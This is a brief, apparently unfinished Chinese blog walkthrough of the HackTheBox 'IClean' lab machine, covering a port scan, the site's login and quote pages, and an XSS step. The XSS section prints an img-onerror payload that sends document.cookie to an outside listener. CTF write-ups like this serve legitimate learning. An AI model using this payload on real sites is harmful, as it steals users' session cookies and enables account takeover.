---
title: hackthebox-IClean-walkthrough 
tags: [NetSec,Linux]
categories: [hackthebox]
---

IClean 获取flag
===

## 机器环境
### 目标机器 

IP : 10.10.11.12

![alt text](../assets/img/image-62.png)


> 由于我想要使用windows中的浏览器和burpusuite进行攻击, 但是同时想要使用kali中的工具进行攻击，如何实现呢？
> ![alt text](../assets/img/image-64.png)

### 宿主机器

IP : 

![alt text](../assets/img/image-63.png)


## 渗透思路

1. 给的是IP地址，直接扫描端口
    ![alt text](../assets/img/image-65.png)
    被扫坏了 重新启动

2. 看到80端口，直接访问
    ![alt text](../assets/img/image-66.png)
    登录API
    http://capiclean.htb/login
    http://capiclean.htb/quote

    ![alt text](../assets/img/image-69.png)
    

### XSS
 
  web界面
  ![alt text](../assets/img/image-70.png)


    ```bash
  <img src=x onerror=fetch("http://192.168.31.241:4321/"+document.cookie);>
    ```

### cao, 遮掉网络不稳啊

玩玩ctf吧， 好像白天稳啊